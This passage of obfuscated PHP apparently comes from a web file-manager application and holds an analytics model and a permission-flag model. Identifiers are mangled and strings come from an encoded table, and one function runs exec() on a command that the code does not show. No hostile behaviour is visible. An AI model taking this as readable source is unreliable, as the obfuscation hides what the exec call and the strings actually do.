show_tips(clear_html($‡“‹²íî) . $á¡Ÿİ¿â[1334]); } return array($á¡Ÿİ¿â[419] => intval($„’ìŞÉ[0]), $á¡Ÿİ¿â[84] => $„’ìŞÉ[1], $á¡Ÿİ¿â[1328] => array_slice($„’ìŞÉ, 1)); } } goto DËá¤§Ö Ä; Eõƒáó’Ã­: define($_SERVER[ßğøİ][612], $_SERVER[ßğøİ][613]); $ktujqfhnbs = $_SERVER[ßğøİ][614]; if (strlen($ktujqfhnbs) < $_SERVER[ßğøİ][615]) { die; } goto d®éÚ¨Æ‡Ô; DÃ·Š ¹¨Û: class AnalysisModel extends ModelBaseLight { public function init($•ÄğÏ¸) { $ÕÅÃº§è =& $_SERVER[ßğøİ]; $ø£çÑ = array($ÕÅÃº§è[600] => array($ÕÅÃº§è[33] => $ÕÅÃº§è[1757], $ÕÅÃº§è[273] => array($ÕÅÃº§è[224], $ÕÅÃº§è[762], $ÕÅÃº§è[1758], $ÕÅÃº§è[1759])), $ÕÅÃº§è[1760] => array($ÕÅÃº§è[33] => $ÕÅÃº§è[1761], $ÕÅÃº§è[273] => array($ÕÅÃº§è[224], $ÕÅÃº§è[760], $ÕÅÃº§è[1762], $ÕÅÃº§è[1763], $ÕÅÃº§è[1764]))); if (!isset($ø£çÑ[$•ÄğÏ¸])) { return !1; } $this->optionType = $ø£çÑ[$•ÄğÏ¸][$ÕÅÃº§è[33]]; $this->field = $ø£çÑ[$•ÄğÏ¸][$ÕÅÃº§è[273]]; return !0; } public function listData($Íª¸¾ = false, $ãø²à…à = "\x6d\157\144\x69\x66\171\x54\151\155\x65", $“ÍÛìîÁ = false) { return parent::listData($Íª¸¾, $ãø²à…à, $“ÍÛìîÁ); } public function trendList($Êå»Û‹) { $ßŞù‡Ô  =& $_SERVER[ßğøİ]; $üÔôö³Å = $this->listData(); if ($üÔôö³Å) { $÷üáåš = end($üÔôö³Å); $ÉÍ£³¹‹ = date($ßŞù‡Ô [1765], strtotime($ßŞù‡Ô [1766])); if ($÷üáåš[$ßŞù‡Ô [224]] == $ÉÍ£³¹‹) { return $üÔôö³Å; } $¢Î§¾”Ô = strtotime($÷üáåš[$ßŞù‡Ô [224]]); } if (!isset($¢Î§¾”Ô)) { $î•ÔŞ±‹ = $Êå»Û‹ == $ßŞù‡Ô [600] ? $ßŞù‡Ô [535] : $ßŞù‡Ô [822]; $¢Î§¾”Ô = Model($î•ÔŞ±‹)->min($ßŞù‡Ô [200]); } $ÇÊ¹îë = $ßŞù‡Ô [1767] . ucfirst($Êå»Û‹); $ÑÀ—º¥  = $this->dateList($¢Î§¾”Ô); foreach ($ÑÀ—º¥  as $ÉÍ£³¹‹) { $this->{$ÇÊ¹îë}($ÉÍ£³¹‹); } return $this->listData(); } private function dateList($‡›«¼§Ë) { $¸ü§ï¹½ =& $_SERVER[ßğøİ]; $•ëù˜ú‡ = $‡›«¼§Ë; $ƒ¹éÎ = strtotime($¸ü§ï¹½[1766]); $Úôçª•¤ = array(); while ($•ëù˜ú‡ <= $ƒ¹éÎ) { $Úôçª•¤[] = date($¸ü§ï¹½[1765], $•ëù˜ú‡); $•ëù˜ú‡ = strtotime($¸ü§ï¹½[1768], $•ëù˜ú‡); } return $Úôçª•¤; } public function _recordUser($íØùÄ’Î = '') { $Ñ ŒÛ€ =& $_SERVER[ßğøİ]; $°œÆ¬üğ = strtotime(date($Ñ ŒÛ€[1769], strtotime($íØùÄ’Î))); $Û«óˆÄ« = strtotime(date($Ñ ŒÛ€[1770], strtotime($íØùÄ’Î))); $Êô°Óğİ = array($Ñ ŒÛ€[200] => array($Ñ ŒÛ€[1013], $Û«óˆÄ«)); $£‚·öƒŒ = Model($Ñ ŒÛ€[535])->where($Êô°Óğİ)->count($Ñ ŒÛ€[1655]); $Êô°Óğİ[$Ñ ŒÛ€[200]] = array($Ñ ŒÛ€[333], array($°œÆ¬üğ, $Û«óˆÄ«)); $ÛŸãÉå² = Model($Ñ ŒÛ€[535])->where($Êô°Óğİ)->count($Ñ ŒÛ€[1655]); $Êô°Óğİ[$Ñ ŒÛ€[33]] = $Ñ ŒÛ€[1771]; $øÅ½æ³¨ = Model($Ñ ŒÛ€[1772])->where($Êô°Óğİ)->count($Ñ ŒÛ€[1773]); $ÔØª¤   = array($Ñ ŒÛ€[224] => $íØùÄ’Î, $Ñ ŒÛ€[762] => (int) $£‚·öƒŒ, $Ñ ŒÛ€[1758] => (int) $ÛŸãÉå², $Ñ ŒÛ€[1759] => (int) $øÅ½æ³¨); return $this->insert($ÔØª¤  ); } public function _recordStore($Ìõı£¤¯ = '') { $½‚¤õ´… =& $_SERVER[ßğøİ]; $ê²éãöÊ = strtotime(date($½‚¤õ´…[1770], strtotime($Ìõı£¤¯))); $óÃáÒÃ” = array($½‚¤õ´…[200] => array($½‚¤õ´…[1013], $ê²éãöÊ)); $²Œ¨¬­ü = Model($½‚¤õ´…[471])->where($óÃáÒÃ”)->sum($½‚¤õ´…[76]); $óÃáÒÃ”[$½‚¤õ´…[410]] = 0; $Áş÷§¥â = Model($½‚¤õ´…[822])->where($óÃáÒÃ”)->sum($½‚¤õ´…[76]); $óÃáÒÃ”[$½‚¤õ´…[411]] = 1; $¥êÅªÏ¾ = Model($½‚¤õ´…[822])->where($óÃáÒÃ”)->sum($½‚¤õ´…[76]); $óÃáÒÃ”[$½‚¤õ´…[411]] = 2; $—Í´š¶ = Model($½‚¤õ´…[822])->where($óÃáÒÃ”)->sum($½‚¤õ´…[76]); $Ùˆ²îØÜ = array($½‚¤õ´…[224] => $Ìõı£¤¯, $½‚¤õ´…[760] => (int) $Áş÷§¥â, $½‚¤õ´…[1762] => (int) $²Œ¨¬­ü, $½‚¤õ´…[1763] => (int) $¥êÅªÏ¾, $½‚¤õ´…[1764] => (int) $—Í´š¶); return $this->insert($Ùˆ²îØÜ); } public function trend($ßë¢Ï¯é, $ºˆ„‹¤) { $½ÖİÌŸˆ =& $_SERVER[ßğøİ]; if (!$this->init($ßë¢Ï¯é)) { return !1; } $®ş«†ãê = $this->trendList($ßë¢Ï¯é); if ($®ş«†ãê && $ºˆ„‹¤ != $½ÖİÌŸˆ[1628]) { $ı´¢©à = $®ş«†ãê[0][$½ÖİÌŸˆ[224]]; $›ŠÉ’›÷ = $this->validDate($ºˆ„‹¤, $ı´¢©à); $›ä±Í­â = array(); $âà™çÜŞ = array_to_keyvalue($®ş«†ãê, $½ÖİÌŸˆ[224]); foreach ($›ŠÉ’›÷ as $‹Í¯‘£ë) { if (isset($âà™çÜŞ[$‹Í¯‘£ë])) { $—âÍ‘À˜ = $âà™çÜŞ[$‹Í¯‘£ë]; } else { $—âÍ‘À˜ = end($®ş«†ãê); $—âÍ‘À˜[$½ÖİÌŸˆ[224]] = $‹Í¯‘£ë; if ($ßë¢Ï¯é == $½ÖİÌŸˆ[600]) { $—âÍ‘À˜[$½ÖİÌŸˆ[1758]] = $—âÍ‘À˜[$½ÖİÌŸˆ[1759]] = 0; } } $›ä±Í­â[] = $—âÍ‘À˜; } $®ş«†ãê = $›ä±Í­â; } $ãÈ‘óö¾ = array($½ÖİÌŸˆ[600] => array($½ÖİÌŸˆ[762] => LNG($½ÖİÌŸˆ[1774]), $½ÖİÌŸˆ[1758] => LNG($½ÖİÌŸˆ[1775]), $½ÖİÌŸˆ[1759] => LNG($½ÖİÌŸˆ[1776])), $½ÖİÌŸˆ[1760] => array($½ÖİÌŸˆ[760] => LNG($½ÖİÌŸˆ[1777]), $½ÖİÌŸˆ[1762] => LNG($½ÖİÌŸˆ[1778]), $½ÖİÌŸˆ[1763] => LNG($½ÖİÌŸˆ[1779]), $½ÖİÌŸˆ[1764] => LNG($½ÖİÌŸˆ[1780]))); $İû×õ¡ = array($½ÖİÌŸˆ[600] => $½ÖİÌŸˆ[1781], $½ÖİÌŸˆ[1760] => $½ÖİÌŸˆ[76]); if (empty($®ş«†ãê)) { $‹Í¯‘£ë = date($½ÖİÌŸˆ[1765], strtotime($½ÖİÌŸˆ[1766])); $¹‰Ñ™é = array($½ÖİÌŸˆ[224] => $‹Í¯‘£ë); foreach ($ãÈ‘óö¾[$ßë¢Ï¯é] as $ÑÁó‡òø => $Í‘ÁµûÀ) { $¹‰Ñ™é[$ÑÁó‡òø] = 0; } $®ş«†ãê[] = $¹‰Ñ™é; } $²Ü“ÚŞæ = array(); foreach ($®ş«†ãê as $Í‘ÁµûÀ) { if ($ßë¢Ï¯é == $½ÖİÌŸˆ[1760] && $Í‘ÁµûÀ[$½ÖİÌŸˆ[1762]] > $Í‘ÁµûÀ[$½ÖİÌŸˆ[760]]) { $Í‘ÁµûÀ[$½ÖİÌŸˆ[1762]] = $Í‘ÁµûÀ[$½ÖİÌŸˆ[760]]; } foreach ($ãÈ‘óö¾[$ßë¢Ï¯é] as $ÑÁó‡òø => $ú™èãº¶) { $—âÍ‘À˜ = array($½ÖİÌŸˆ[224] => $Í‘ÁµûÀ[$½ÖİÌŸˆ[224]], $½ÖİÌŸˆ[1554] => $ú™èãº¶); $—âÍ‘À˜[$İû×õ¡[$ßë¢Ï¯é]] = isset($Í‘ÁµûÀ[$ÑÁó‡òø]) ? $Í‘ÁµûÀ[$ÑÁó‡òø] : 0; $²Ü“ÚŞæ[] = $—âÍ‘À˜; } } return $²Ü“ÚŞæ; } public function validDate($’¨÷îôš, $µø±à«å) { $ŠèÅÅé¨ =& $_SERVER[ßğøİ]; $¢û’êÜô = date($ŠèÅÅé¨[1765], strtotime($ŠèÅÅé¨[1766])); $“»¾Á’Ï = array($¢û’êÜô); switch ($’¨÷îôš) { case $ŠèÅÅé¨[1635]: $ÒÜãã™ = mktime(0, 0, 0, date($ŠèÅÅé¨[1782]), date($ŠèÅÅé¨[1375]) - date($ŠèÅÅé¨[1438]) + 7 - 7, date($ŠèÅÅé¨[1783])); $Ã‡¾¥ÊÛ = 0; do { $´öÜ¾Ñ¼ = date($ŠèÅÅé¨[1765], $ÒÜãã™ - 3600 * 24 * 7 * $Ã‡¾¥ÊÛ); $“»¾Á’Ï[] = $´öÜ¾Ñ¼; $Ã‡¾¥ÊÛ++; } while ($µø±à«å < $´öÜ¾Ñ¼); break; case $ŠèÅÅé¨[1633]: $Ã‡¾¥ÊÛ = 1; do { $’¯¬“¬ = date($ŠèÅÅé¨[1784], strtotime("\55\x20{$Ã‡¾¥ÊÛ}\40\155\157\x6e\x74\150\163")); $“»¾Á’Ï[] = $’¯¬“¬; $Ã‡¾¥ÊÛ++; } while ($µø±à«å < $’¯¬“¬); break; case $ŠèÅÅé¨[1785]: $Ìô‹ï¤® = (int) date($ŠèÅÅé¨[1783], strtotime($µø±à«å)); $¬¿‰¾ÙÔ = (int) date($ŠèÅÅé¨[1783]); if ($Ìô‹ï¤® >= $¬¿‰¾ÙÔ) { break; } for ($Ìô‹ï¤®; $Ìô‹ï¤® < $¬¿‰¾ÙÔ; $Ìô‹ï¤®++) { $“»¾Á’Ï[] = $Ìô‹ï¤® . $ŠèÅÅé¨[1786]; } break; default: break; } if ($µø±à«å > end($“»¾Á’Ï)) { array_pop($“»¾Á’Ï); } sort($“»¾Á’Ï); return $“»¾Á’Ï; } public function listTable($·ÏŞŠ—¯) { $»¦ëò¥Â = ucfirst($·ÏŞŠ—¯); return Model($»¦ëò¥Â)->listData(); } public function option($¶«ğÌá‘) { $èÆ»ôÂ = $_SERVER[ßğøİ][1787] . ucfirst($¶«ğÌá‘); return $this->{$èÆ»ôÂ}(); } private function optionUser() { $¾ôô½ğ÷ =& $_SERVER[ßğøİ]; $è®œÈÑ· = Model($¾ôô½ğ÷[535])->count($¾ôô½ğ÷[1655]); $àÎ˜Æˆ¦ = Model($¾ôô½ğ÷[535])->where($¾ôô½ğ÷[1788])->count($¾ôô½ğ÷[1655]); $ŞùÙ­Ğ = intval($GLOBALS[$¾ôô½ğ÷[6]][$¾ôô½ğ÷[349]][$¾ôô½ğ÷[1610]]) / 3600; $ÊèÀ¶±Ú = strtotime("\55{$ŞùÙ­Ğ}\x20\150\x6f\165\162\163"); $¾ş½ÆÄ‡ = strtotime(date($¾ôô½ğ÷[1769])); if ($ÊèÀ¶±Ú < $¾ş½ÆÄ‡) { $ÊèÀ¶±Ú = $¾ş½ÆÄ‡; } $Ó¹öô™ = array($¾ôô½ğ÷[1789] => array($¾ôô½ğ÷[1014], $ÊèÀ¶±Ú)); $˜Ø˜ëÌÌ = (int) Model($¾ôô½ğ÷[535])->where($Ó¹öô™)->count($¾ôô½ğ÷[1655]); if (!$˜Ø˜ëÌÌ) { $˜Ø˜ëÌÌ = 1; } $Ó¹öô™ = array($¾ôô½ğ÷[1789] => array($¾ôô½ğ÷[1014], $¾ş½ÆÄ‡)); $ê‰¾šë = Model($¾ôô½ğ÷[535])->where($Ó¹öô™)->count($¾ôô½ğ÷[1655]); return array($¾ôô½ğ÷[756] => (int) $è®œÈÑ·, $¾ôô½ğ÷[1790] => (int) ($è®œÈÑ· - $àÎ˜Æˆ¦), $¾ôô½ğ÷[1791] => (int) $àÎ˜Æˆ¦, $¾ôô½ğ÷[1792] => (int) $ê‰¾šë, $¾ôô½ğ÷[1793] => $˜Ø˜ëÌÌ); } private function optionFile() { $¡¥¢÷ûÊ =& $_SERVER[ßğøİ]; $Şº÷¾ğÇ = $this->sourceSize(); $•Ì—ş¥ = $Şº÷¾ğÇ[$¡¥¢÷ûÊ[76]]; $·í±ÏãŸ = $Şº÷¾ğÇ[$¡¥¢÷ûÊ[1762]]; $šÕÈ£–Ï = Model($¡¥¢÷ûÊ[822])->where(array($¡¥¢÷ûÊ[410] => 0))->count($¡¥¢÷ûÊ[402]); $ü£¤ë§ï = array($¡¥¢÷ûÊ[410] => 0, $¡¥¢÷ûÊ[200] => array($¡¥¢÷ûÊ[1014], strtotime(date($¡¥¢÷ûÊ[1769])))); $ƒùæÍîƒ = Model($¡¥¢÷ûÊ[822])->where($ü£¤ë§ï)->sum($¡¥¢÷ûÊ[76]); $§˜ÒøÁ = Model($¡¥¢÷ûÊ[822])->where($ü£¤ë§ï)->count($¡¥¢÷ûÊ[402]); return array($¡¥¢÷ûÊ[760] => $•Ì—ş¥, $¡¥¢÷ûÊ[1762] => $·í±ÏãŸ, $¡¥¢÷ûÊ[1794] => $•Ì—ş¥ - $·í±ÏãŸ, $¡¥¢÷ûÊ[1795] => (int) $ƒùæÍîƒ, $¡¥¢÷ûÊ[762] => (int) $šÕÈ£–Ï, $¡¥¢÷ûÊ[1796] => (int) $§˜ÒøÁ); } private function optionAccess() { $ø³øå³µ =& $_SERVER[ßğøİ]; return array($ø³øå³µ[756] => $this->typeLogCnt(), $ø³øå³µ[107] => $this->typeLogCnt($ø³øå³µ[107]), $ø³øå³µ[452] => $this->typeLogCnt($ø³øå³µ[452]), $ø³øå³µ[1797] => $this->typeLogCnt($ø³øå³µ[1797]), $ø³øå³µ[1798] => $this->typeLogCnt($ø³øå³µ[1798]), $ø³øå³µ[600] => $this->typeLogCnt($ø³øå³µ[12], $ø³øå³µ[1773])); } private function typeLogCnt($÷Çïô˜ì = '', $Ê•©ıµ = "\x69\x64") { $•Ç¸ÆÛş =& $_SERVER[ßğøİ]; $çÜé£ìŞ = array($•Ç¸ÆÛş[107] => array($•Ç¸ÆÛş[1799], $•Ç¸ÆÛş[1800]), $•Ç¸ÆÛş[452] => array($•Ç¸ÆÛş[1801], $•Ç¸ÆÛş[1802]), $•Ç¸ÆÛş[1797] => array($•Ç¸ÆÛş[1803], $•Ç¸ÆÛş[1804], $•Ç¸ÆÛş[1805]), $•Ç¸ÆÛş[1798] => array($•Ç¸ÆÛş[1806], $•Ç¸ÆÛş[1807]), $•Ç¸ÆÛş[1808] => array($•Ç¸ÆÛş[1809], $•Ç¸ÆÛş[1810], $•Ç¸ÆÛş[1811])); $æŒ˜Üá = strtotime(date($•Ç¸ÆÛş[1769])); $™şì‹‡² = array($•Ç¸ÆÛş[200] => array($•Ç¸ÆÛş[1014], $æŒ˜Üá)); if ($÷Çïô˜ì) { $™şì‹‡²[$•Ç¸ÆÛş[33]] = array($•Ç¸ÆÛş[7], $çÜé£ìŞ[$÷Çïô˜ì]); } $Ìò€â´ = Model($•Ç¸ÆÛş[1772])->where($™şì‹‡²)->count($Ê•©ıµ); return (int) $Ìò€â´; } private function optionServer() { $ßÎ²ˆÕ =& $_SERVER[ßğøİ]; $Şİšıâ = $this->diskDriver(); $»Ã°øò = KodIO::defaultDriver(); $À–œ×ô÷ = array($ßÎ²ˆÕ[814] => $»Ã°øò[$ßÎ²ˆÕ[399]]); $›°Ï«èğ = Model($ßÎ²ˆÕ[471])->where($À–œ×ô÷)->sum($ßÎ²ˆÕ[76]); $‚ĞƒÙæ = explode($ßÎ²ˆÕ[53], $_SERVER[$ßÎ²ˆÕ[143]]); $ŠîË¾œÚ = $‚ĞƒÙæ[0]; $åç½¼áş = $GLOBALS[$ßÎ²ˆÕ[6]][$ßÎ²ˆÕ[21]]; $Ú•šµÑ = $åç½¼áş[$ßÎ²ˆÕ[976]]; if ($Ú•šµÑ == $ßÎ²ˆÕ[964]) { $›šŸ±² = explode($ßÎ²ˆÕ[1272], $åç½¼áş[$ßÎ²ˆÕ[975]]); $Ú•šµÑ = $›šŸ±²[0]; } if ($Ú•šµÑ == $ßÎ²ˆÕ[912] || $Ú•šµÑ == $ßÎ²ˆÕ[801]) { $›îÄ¸ğÒ = Model()->db()->query($ßÎ²ˆÕ[1812]); $ˆÚÑ¡¾¡ = $›îÄ¸ğÒ[0] && isset($›îÄ¸ğÒ[0][$ßÎ²ˆÕ[1553]]) ? $›îÄ¸ğÒ[0][$ßÎ²ˆÕ[1553]] : 0; $Ú•šµÑ = $ßÎ²ˆÕ[1813] . ($ˆÚÑ¡¾¡ ? $ßÎ²ˆÕ[8] . $ˆÚÑ¡¾¡ : $ßÎ²ˆÕ[12]); } $‰ÎØ¶æ = $GLOBALS[$ßÎ²ˆÕ[6]][$ßÎ²ˆÕ[349]][$ßÎ²ˆÕ[824]]; return array($ßÎ²ˆÕ[1814] => $Şİšıâ ? $Şİšıâ[$ßÎ²ˆÕ[1815]] : 0, $ßÎ²ˆÕ[1816] => $Şİšıâ ? $Şİšıâ[$ßÎ²ˆÕ[1817]] : 0, $ßÎ²ˆÕ[1818] => (int) $»Ã°øò[$ßÎ²ˆÕ[1815]] * 1024 * 1024 * 1024, $ßÎ²ˆÕ[1819] => (int) $›°Ï«èğ, $ßÎ²ˆÕ[1820] => ucfirst($ŠîË¾œÚ), $ßÎ²ˆÕ[1821] => $ßÎ²ˆÕ[1822] . PHP_VERSION, $ßÎ²ˆÕ[1823] => phpBuild64() ? 64 : 32, $ßÎ²ˆÕ[755] => str_replace($ßÎ²ˆÕ[1130], $ßÎ²ˆÕ[992], $Ú•šµÑ), $ßÎ²ˆÕ[349] => ucfirst($‰ÎØ¶æ), $ßÎ²ˆÕ[32] => $_SERVER[$ßÎ²ˆÕ[1824]]); } private function diskDriver() { $­ûï­œ± =& $_SERVER[ßğøİ]; $‰˜¹ğê“ = $­ûï­œ±[8]; $šæşŞ´ = $GLOBALS[$­ûï­œ±[6]][$­ûï­œ±[1288]] == $­ûï­œ±[1289]; if ($šæşŞ´) { $‰˜¹ğê“ = $­ûï­œ±[1825]; if (function_exists($­ûï­œ±[1826])) { exec($­ûï­œ±[1827], $ßÇî‹±ş); $‰˜¹ğê“ = $ßÇî‹±ş[1] . $­ûï­œ±[8]; } } if (!file_exists($‰˜¹ğê“)) { return; } $ç„ÈóøÎ = @disk_total_space($‰˜¹ğê“); $ûšë‡ï = $ç„ÈóøÎ - @disk_free_space($‰˜¹ğê“); return array($­ûï­œ±[1815] => $ç„ÈóøÎ, $­ûï­œ±[1817] => $ûšë‡ï); } public function fileChart($Ã‘’£Í ) { $âØ‘óªÒ =& $_SERVER[ßğøİ]; if (isset($Ã‘’£Í [$âØ‘óªÒ[1655]])) { return Model($âØ‘óªÒ[822])->userFileTypeProfile($Ã‘’£Í [$âØ‘óªÒ[1655]]); } if (isset($Ã‘’£Í [$âØ‘óªÒ[1828]])) { return Model($âØ‘óªÒ[822])->groupFileTypeProfile($Ã‘’£Í [$âØ‘óªÒ[1828]]); } $ÍÒ› Å = $this->sourceSize(); $Ïì¼¼Ö = array($âØ‘óªÒ[432] => 0, $âØ‘óªÒ[411] => 1); $èì…İíæ = Model($âØ‘óªÒ[822])->where($Ïì¼¼Ö)->sum($âØ‘óªÒ[76]); $Ïì¼¼Ö[$âØ‘óªÒ[411]] = 2; $ Çß„Š = Model($âØ‘óªÒ[822])->where($Ïì¼¼Ö)->sum($âØ‘óªÒ[76]); return array($âØ‘óªÒ[760] => $ÍÒ› Å[$âØ‘óªÒ[76]], $âØ‘óªÒ[1762] => $ÍÒ› Å[$âØ‘óªÒ[1762]], $âØ‘óªÒ[1763] => (int) $èì…İíæ, $âØ‘óªÒ[1764] => (int) $ Çß„Š); } private function sourceSize() { $½˜ùüŞ =& $_SERVER[ßğøİ]; $Ä£îÙ‹¨ = Model($½˜ùüŞ[822])->where(array($½˜ùüŞ[410] => 0))->sum($½˜ùüŞ[76]); $ñ»Ë¨¢ = Model($½˜ùüŞ[471])->sum($½˜ùüŞ[76]); if ($ñ»Ë¨¢ > $Ä£îÙ‹¨) { $ñ»Ë¨¢ = $Ä£îÙ‹¨; } return array($½˜ùüŞ[76] => (int) $Ä£îÙ‹¨, $½˜ùüŞ[1762] => (int) $ñ»Ë¨¢); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ŒÇ±ûˆû =& $_SERVER[ßğøİ]; $‡ÇääªÁ = array(array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1829]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1831], $ŒÇ±ûˆû[1832] => 1, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1835]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1836], $ŒÇ±ûˆû[1832] => 2, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1837]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1838], $ŒÇ±ûˆû[1832] => 3, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1839]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1840], $ŒÇ±ûˆû[1832] => 4, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_VIEW), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1841]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1842], $ŒÇ±ûˆû[1832] => 5, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1843]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1844], $ŒÇ±ûˆû[1832] => 6, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ŒÇ±ûˆû[420] => LNG($ŒÇ±ûˆû[1845]), $ŒÇ±ûˆû[1830] => $ŒÇ±ûˆû[1846], $ŒÇ±ûˆû[1832] => 7, $ŒÇ±ûˆû[1833] => 1, $ŒÇ±ûˆû[1834] => 0)); return $‡ÇääªÁ; } public static function authCheck($²ÀÈóô, $‰ŞÓÍØ”) { $²¸Ú…Ğ =& $_SERVER[ßğøİ]; $²ÀÈóô = intval($²ÀÈóô); if ($GLOBALS[$²¸Ú…Ğ[503]] && $GLOBALS[$²¸Ú…Ğ[6]][$²¸Ú…Ğ[1847]]) { return !0; } if ($²ÀÈóô <= 0) { return !1; } if (($²ÀÈóô & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($²ÀÈóô & $‰ŞÓÍØ”); } public static function authCheckShow($Ú³ü±Éø) { return self::authCheck($Ú³ü±Éø, self::AUTH_SHOW); } public static function authCheckView($ıáÃä×) { return self::authCheck($ıáÃä×, self::AUTH_VIEW); } public static function authCheckDownload($ßÁ€±Šç) { return self::authCheck($ßÁ€±Šç, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ì¥®„ ¼) { return self::authCheck($Ì¥®„ ¼, self::AUTH_UPLOAD); } public static function authCheckEdit($İ»¡Î ü) { return self::authCheck($İ»¡Î ü, self::AUTH_EDIT); } public static function authCheckRemove($‘á€òŠÆ) { return self::authCheck($‘á€òŠÆ, self::AUTH_REMOVE); } public static function authCheckShare($ıïŞæíÙ) { return self::authCheck($ıïŞæíÙ, self::AUTH_SHARE); } public static function authCheckComment($ÉŒ¾Èû·) { return self::authCheck($ÉŒ¾Èû·, self::AUTH_COMMENT); } public static function authCheckEvent($¤µ½‹€Ü) { return self::authCheck($¤µ½‹€Ü, self::AUTH_EVENT); } public static function authCheckRoot($§ËŠµ£É) { return self::authCheck($§ËŠµ£É, self::AUTH_ROOT); } public static function authCheckAction($¨Ş®ªÎ¿, $¬ì­Ğ³î) { $–Èµ—Ú =& $_SERVER[ßğøİ]; $à ŸëÆÏ = array($–Èµ—Ú[1848] => self::AUTH_VIEW, $–Èµ—Ú[1199] => self::AUTH_DOWNLOAD, $–Èµ—Ú[107] => self::AUTH_UPLOAD, $–Èµ—Ú[1798] => self::AUTH_EDIT, $–Èµ—Ú[1797] => self::AUTH_REMOVE, $–Èµ—Ú[1808] => self::AUTH_SHARE, $–Èµ—Ú[354] => self::AUTH_COMMENT, $–Èµ—Ú[1643] => self::AUTH_EVENT, $–Èµ—Ú[1849] => self::AUTH_ROOT); if (!isset($à ŸëÆÏ[$¬ì­Ğ³î])) { return; } $‡àŞ‰³… = $à ŸëÆÏ[$¬ì­Ğ³î]; $¨Ş®ªÎ¿ = intval($¨Ş®ªÎ¿); if ($¨Ş®ªÎ¿ <= 0) { return !1; } if (($¨Ş®ªÎ¿ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¨Ş®ªÎ¿ & $‡àŞ‰³…); } public static function authDisable($¯Ûæ«“, $âÁÚ‡ÊÙ) { if (intval($¯Ûæ«“) <= 0) { return 0; } return intval($¯Ûæ«“) & ~$âÁÚ‡ÊÙ; } public $optionType = "\123\171\163\x74\145\155\x2e\163\157\165\x72\143\x65\x41\x75\164\150\x4c\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\x74\x68", "\x6c\x61\142\x65\x6c", "\144\x69\x73\x70\x6c\141\171", "\x73\171\163\x74\x65\155", "\x73\157\162\164"); public function initData() { $€à™É«” = $this->authDefault(); foreach ($€à™É«” as $ï²‡ã¼„) { $this->add($ï²‡ã¼„); } } public function findAuth($÷ç™±È, $àËå°Ë’) { $Ì•†“” =& $_SERVER[ßğøİ]; $ŞæéÁ¢ú = parent::listData(); foreach ($ŞæéÁ¢ú as $ƒ–€¬·) { $¹èÙ¾èŠ = intval($ƒ–€¬·[$Ì•†“”[413]]); if ($¹èÙ¾èŠ <= 0 || $ƒ–€¬·[$Ì•†“”[1850]] == 0) { continue; } if (($¹èÙ¾èŠ & $÷ç™±È) != $÷ç™±È) { continue; } if (($¹èÙ¾èŠ & $àËå°Ë’) != 0) { continue; } return $ƒ–€¬·[$Ì•†“”[399]]; } return !1; } public function findAuthReadOnly() { $Ì‘Ô½À‚ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $†¼Æ®¯ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ì‘Ô½À‚, $†¼Æ®¯); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $×ß«Ÿ™œ =& $_SERVER[ßğøİ]; $Û½¢û´ê = parent::listData(); $²üÁù– = !1; foreach ($Û½¢û´ê as $ÛáÓøÍ) { if ($ÛáÓøÍ[$×ß«Ÿ™œ[413]] <= 0 || $ÛáÓøÍ[$×ß«Ÿ™œ[1850]] == $×ß«Ÿ™œ[197]) { continue; } if (!$²üÁù–) { $²üÁù– = $ÛáÓøÍ; continue; } if ($²üÁù–[$×ß«Ÿ™œ[413]] > 